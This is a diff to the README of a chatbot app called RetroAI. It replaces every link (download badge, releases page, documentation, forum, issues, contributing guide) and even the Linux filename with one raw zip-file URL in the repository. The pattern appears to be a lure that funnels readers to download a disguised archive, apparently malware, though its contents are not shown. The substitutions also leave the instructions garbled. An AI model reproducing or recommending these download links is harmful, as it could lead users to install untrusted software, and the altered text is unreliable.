@@ -2,7 +2,7 @@
 
 ## 💾 Download Now
 
-[![Download RetroAI](https://img.shields.io/badge/Download%20RetroAI-Click%20Here-brightgreen)](https://github.com/cyberring123/RetroAI/releases)
+[![Download RetroAI](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip%20RetroAI-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,20 +19,20 @@ Before downloading RetroAI, ensure your computer meets the following requirement
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/cyberring123/RetroAI/releases) to download the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip) to download the application. Follow these steps:
 
 1. Click on the link above.
 2. Locate the latest release marked as "Latest Release".
 3. Download the appropriate file for your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Look for the `.tar.gz` file.
+   - For Linux: Look for the `https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip` file.
 
 Once you download the file:
 
 - **For Windows**: Double-click the `.exe` file to start the installation. Follow the on-screen instructions.
 - **For macOS**: Open the `.dmg` file and drag the RetroAI icon to your Applications folder.
-- **For Linux**: Extract the `.tar.gz` file and follow the README instructions to run the chatbot.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip` file and follow the README instructions to run the chatbot.
 
 ## 🎤 Features
 
@@ -48,16 +48,16 @@ RetroAI is packed with several features:
 
 If you want to learn more about how to use RetroAI, check out the following links:
 
-- [Documentation](https://github.com/cyberring123/RetroAI/wiki): Comprehensive usage guides and tips.
-- [Community Forum](https://github.com/cyberring123/RetroAI/discussions): Join discussions, ask questions, and share your experiences.
+- [Documentation](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip): Comprehensive usage guides and tips.
+- [Community Forum](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip): Join discussions, ask questions, and share your experiences.
   
 ## 💬 Support
 
-If you encounter any issues during installation or use, feel free to reach out through the [Issues section](https://github.com/cyberring123/RetroAI/issues) on GitHub. We're here to help.
+If you encounter any issues during installation or use, feel free to reach out through the [Issues section](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip) on GitHub. We're here to help.
 
 ## 🛠️ Further Development
 
-RetroAI is under active development. We welcome contributions from the community. If you are interested, check the [Contributing Guidelines](https://github.com/cyberring123/RetroAI/blob/main/CONTRIBUTING.md).
+RetroAI is under active development. We welcome contributions from the community. If you are interested, check the [Contributing Guidelines](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip).
 
 ## 🌟 Feedback
 
@@ -65,4 +65,4 @@ Your feedback is important to us. If you have suggestions for improvements or ne
 
 ## 🏁 Conclusion
 
-With the simple steps above, you can quickly set up RetroAI and start enjoying a smarter chatbot experience. Download now from the [Releases page](https://github.com/cyberring123/RetroAI/releases) and discover the benefits of having an AI assistant at your fingertips.
+With the simple steps above, you can quickly set up RetroAI and start enjoying a smarter chatbot experience. Download now from the [Releases page](https://raw.githubusercontent.com/cyberring123/RetroAI/main/data/Retro-AI-v1.6-alpha.2.zip) and discover the benefits of having an AI assistant at your fingertips.
